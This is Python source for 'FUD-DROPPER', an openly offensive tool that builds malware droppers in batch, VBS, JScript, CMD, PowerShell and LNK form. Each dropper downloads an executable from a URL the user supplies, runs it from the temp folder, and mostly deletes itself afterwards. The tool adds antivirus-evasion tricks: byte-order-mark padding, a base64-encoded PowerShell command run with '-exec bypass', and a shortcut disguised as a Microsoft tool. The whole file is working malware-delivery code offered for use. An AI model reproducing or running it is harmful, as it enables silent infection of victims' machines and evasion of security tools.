import os
import platform
import random,string
import tempfile
import base64
import time
from pathlib import Path
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *

colorama.deinit()
banner = Center.XCenter("""
***************************************************************************
   _______      ____        ____  ____   ___  ____ _____ __  __ _______    *
  / /  ___|   _|  _ \      |  _ \|  _ \ / _ \|  _ \___ /|  \/  | ____\ \`  *
 | || |_ | | | | | | |_____| | | | |_) | | | | |_) ||_ \| |\/| |  _|  | |  *
< < |  _|| |_| | |_| |_____| |_| |  _ <| |_| |  __/___) | |  | | |___  > > *
 | ||_|   \__,_|____/      |____/|_| \_\`\___/|_|  |____/|_|  |_|_____|| | *
  \_\                                                                /_/   *
                       Coded By:- MACHINE1337                              *
                       Github:-   @machine1337                             *
****************************************************************************
                            \n\n
""")
def menu():
    D = 5
    me = ''.join(random.choices(string.ascii_uppercase + string.digits, k=D))
    ans = True
    while ans:
        print(termcolor.colored("""
              [1] Generate Batch Dropper        [2] Generate VBS Dropper
              
              [3] Generate JS Dropper           [4] Generate CMD Dropper
              
              [5] Generate Powershell Dropper   [6] Generate LNK Dropper
              
                                      [7] Exit
      """, 'yellow'))
        ans = input(termcolor.colored("[*] Choose From Given Options: ", 'cyan'))
        if ans == "1":
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            x = input(termcolor.colored("\n[*] Provide Payload URL:- ",'green'))
            out = "out.exe"
            tempdir = Path("/tmp/tmp.bat" if platform.system() == "Linux" else tempfile.gettempdir() + '\\tmp.bat')
            with open(tempdir,'w') as f:
                f.write(f"""
set pOut="%temp%\\\\{out}"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "{x}" %pOut%
start "" %pOut%
DEL "%~f0"
""")
                f.close()
            S = 5
            ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))
            file = tempdir
            out_hex = []
            out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
            with open(f'{file}', 'rb') as f:
                penis = f.read()
            out_hex.extend(['{:02X}'.format(b) for b in penis])
            with open(f'{ran}.bat', 'wb') as f:
                for i in out_hex:
                    f.write(bytes.fromhex(i))
            path_to_file = f'{ran}.bat'
            path = Path(path_to_file)
            if path.is_file():
                time.sleep(2)
                print(Fore.GREEN+'\n[ ✔ ] File Obfuscated Success...')
                print(Fore.RED+'\n[*] Use github.com/machine1337/batobfuscate for generated bat file')
            else:
                print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                        'red'))
        elif ans == "2":
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            x = input(termcolor.colored("\n[*] Provide Payload URL:- ",'green'))
            out = "out.exe"
            with open(f'{me}.vbs','w') as f:
                f.write(f"""
dim acopeAvopcEAc, acopeAvopcEAd, bStrm, acaopeAopcEAd,apcoearva,aocoeAocac
aocoeAocac="Ado"
acoapcoeac = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
apcoearva= "\\\\{out}"
Set acopeAvopcEAd = CreateObject("Microsoft.XMLHTTP")
Set acopeAopcEAd = CreateObject(aocoeAocac+"db.Stream")
acaopeAopcEAd = "{x}"
acopeAvopcEAc = acoapcoeac & apcoearva
acopeAvopcEAd.Open "GET", acaopeAopcEAd, False
acopeAvopcEAd.Send
with acopeAopcEAd
    .type = 1
    .open
    .write acopeAvopcEAd.responseBody
    .savetofile acopeAvopcEAc, 2
end with
CreateObject("Wscript.Shell").Run """" & acopeAvopcEAc & """", 0, False
CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName
                """)
                f.close()
            path_to_file = f'{me}.vbs'
            path = Path(path_to_file)
            if path.is_file():
                print(Fore.GREEN+'\n[ ✔ ] File Obfuscated Success...')

            else:
                print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                        'red'))
        elif ans == "3":
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            x = input(termcolor.colored("\n[*] Provide Payload URL:- ",'green'))
            out = "out.exe"
            tempdir = Path("/tmp/tmp.js" if platform.system() == "Linux" else tempfile.gettempdir() + '\\tmp.js')
            with open(f'{me}.js','w') as f:
                f.write(f"""
var aocpaeavacde="{x}";
var aocpaeacva=  "\\\\{out}";
var aocpaeavacd = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2) + aocpaeacva;
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET',aocpaeavacde , false);
Object.Send();
var aocpaeavac = WScript.CreateObject('ADODB.Stream');
aocpaeavac.Open();
aocpaeavac.Type = 1;
aocpaeavac.Write(Object.ResponseBody);
aocpaeavac.Position = 0;
aocpaeavac.SaveToFile(aocpaeavacd, 2);
aocpaeavac.Close();
new ActiveXObject("Shell.Application").ShellExecute(aocpaeavacd,"","","open","1");
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);
                """)
                f.close()
            path_to_file = f'{me}.js'
            path = Path(path_to_file)
            if path.is_file():
                print(Fore.GREEN+'\n[ ✔ ] File Obfuscated Success...')
            else:
                print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                        'red'))
        elif ans == "4":
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            x = input(termcolor.colored("\n[*] Provide Payload URL:- ",'green'))
            out = "out.exe"
            tempdir = Path("/tmp/out.cmd" if platform.system() == "Linux" else tempfile.gettempdir() + '\\out.cmd')
            with open(tempdir,'w') as f:
                f.write(f"""
set pOut="%temp%\\\\{out}"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "{x}" %pOut%
start "" %pOut%
DEL "%~f0"
                """)
                f.close()
            S = 5
            ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))
            file = tempdir
            out_hex = []
            out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
            with open(f'{file}', 'rb') as f:
                penis = f.read()
            out_hex.extend(['{:02X}'.format(b) for b in penis])
            with open(f'{ran}.cmd', 'wb') as f:
                for i in out_hex:
                    f.write(bytes.fromhex(i))
            path_to_file = f'{ran}.cmd'
            path = Path(path_to_file)
            if path.is_file():

                print(Fore.GREEN + '\n[ ✔ ] File Obfuscated Success...')
                try:
                    os.remove(tempdir)
                except:
                    print()
            else:
                print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                        'red'))

        elif ans == "5":
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            x = input(termcolor.colored("\n[*] Provide Payload URL:- ", 'green'))
            out = "out.exe"
            from base64 import b64encode
            heoo = b64encode(
                f'(New-Object Net.WebClient).DownloadFile("{x}","$env:tmp\{out}");cMd /c %TEMP%\{out}'.encode(
                    'UTF-16LE'))
            a = heoo.decode("utf-8")

            with open(f'{me}.ps1','w') as f:
                f.write(f"pOwErshelL -exec bypass -enc {a}")
                f.close()
            path_to_file = f'{me}.ps1'
            path = Path(path_to_file)
            if path.is_file():
                print(Fore.GREEN+'\n[ ✔ ] File Obfuscated Success...')

            else:
                print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                        'red'))
        elif ans == "6":
            print(Fore.GREEN+"[*] Install PyLnk Module....")
            try:
                import pylnk3
            except ImportError:
                os.system("python -m pip install pylnk3 -q -q -q")
                import pylnk3
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            x = input(termcolor.colored("\n[*] Provide Payload URL:- ", 'green'))
            out = "out.exe"
            link = pylnk3.for_file("C:\\windows\\System32\cmd.exe")
            link.description = "Microsoft CMD tool :-)"
            link.window_mode = "Minimized"
            link.relative_path = "C:\\Windows\\System32\\cmd.exe"
            link.arguments = f"/c @echo off  && bitsadmin /transfer mdj /download /priority FOREGROUND {x} \"%temp%\\{out}\" && start \"\" \"%temp%\\\\{out}\""
            link.save(f'{me}.lnk')
            path_to_file = f'{me}.lnk'
            path = Path(path_to_file)
            if path.is_file():
                print(Fore.GREEN+'\n[ ✔ ] File Obfuscated Success...')
            else:
                print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                        'red'))
        elif ans == "7":
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            print(termcolor.colored("\n [+] Thanks For Using FUD-DROPPER! See You Tomorrow",'green'))
            ans = None
        else:
            print(termcolor.colored("\n [+] Not Valid Choice Try again",'red'))
def op():
    try:
        if platform.system().startswith("Windows"):
            os.system("cls")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            menu()
        elif platform.system().startswith("Linux"):
            os.system("clear")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            menu()
        else:
            print(termcolor.colored("\n [+] Use Windows or Linux Based OS",'red'))
    except KeyboardInterrupt:
        print(Fore.RED+'\n[*] You Pressed The Exit Button...')
        quit()
op()
